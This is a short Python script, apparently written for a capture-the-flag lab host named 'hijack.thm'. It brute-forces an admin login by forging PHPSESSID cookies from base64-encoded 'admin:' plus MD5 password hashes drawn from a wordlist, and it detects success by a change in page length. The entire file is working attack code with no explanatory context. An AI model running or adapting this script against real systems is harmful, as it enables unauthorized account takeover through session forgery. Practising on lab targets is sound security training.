#This script brute-forces a login credentials from a url page with customized password list
import hashlib
import base64
import requests

URL = "http://hijack.thm/administration.php"

with open ("password_list", 'r') as _f:
    data = [x.strip() for x in _f.readlines()]

r = requests.get(URL)
page_content = r.text
print(r)

for line in data:
    _hash = hashlib.md5(line.encode('utf-8')).hexdigest().encode('utf-8')
    concat_str = b'admin:' + _hash
    _b64hash = base64.b64encode(concat_str).decode()
    print(_b64hash)
    headers = { "Cookie": f"PHPSESSID={_b64hash}"}
    r = requests.get(URL, headers=headers)
    if len(r.text) > len(page_content):
        print("password: " + line)
        print("cookie: " + _b64hash)
        break
